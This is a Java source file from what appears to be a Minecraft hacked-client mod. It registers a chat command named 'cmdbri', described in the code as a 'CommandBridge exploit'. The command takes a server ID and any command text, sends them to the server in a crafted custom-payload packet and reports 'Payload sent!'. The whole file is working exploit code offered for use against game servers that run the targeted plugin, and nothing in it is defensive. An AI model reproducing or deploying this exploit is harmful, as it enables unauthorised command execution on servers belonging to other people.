package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.ArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.CommandSource;
import net.minecraft.Packet;
import net.minecraft.CustomPayloadC2SPacket;
import net.minecraft.MinecraftClient;
import net.minecraft.CustomPayload;
import io.github.spigotrce.paradiseclientprivate.writer.CommandBridgeWriter;

public class CommandBridge extends Command {
    public CommandBridge(MinecraftClient minecraftClient) {
        super("cmdbri", "CommandBridge exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return (CommandBridge.literal(this.getName()).executes(this::incomplete)).then((CommandBridge.argument("serverID", StringArgumentType.string()).executes(this::incomplete)).then(CommandBridge.argument("command", StringArgumentType.greedyString()).executes(this::sendPayload)));
    }

    private int sendPayload(CommandContext<?> context) {
        Helper.sendPacket(new CustomPayloadC2SPacket(new CommandBridgeWriter(context.getArgument("command", String.class), context.getArgument("serverID", String.class))));
        Helper.printChatMessage("Payload sent!");
        return 1;
    }

    private int incomplete(CommandContext<?> context) {
        Helper.printChatMessage("Incomplete command!");
        return 1;
    }
}
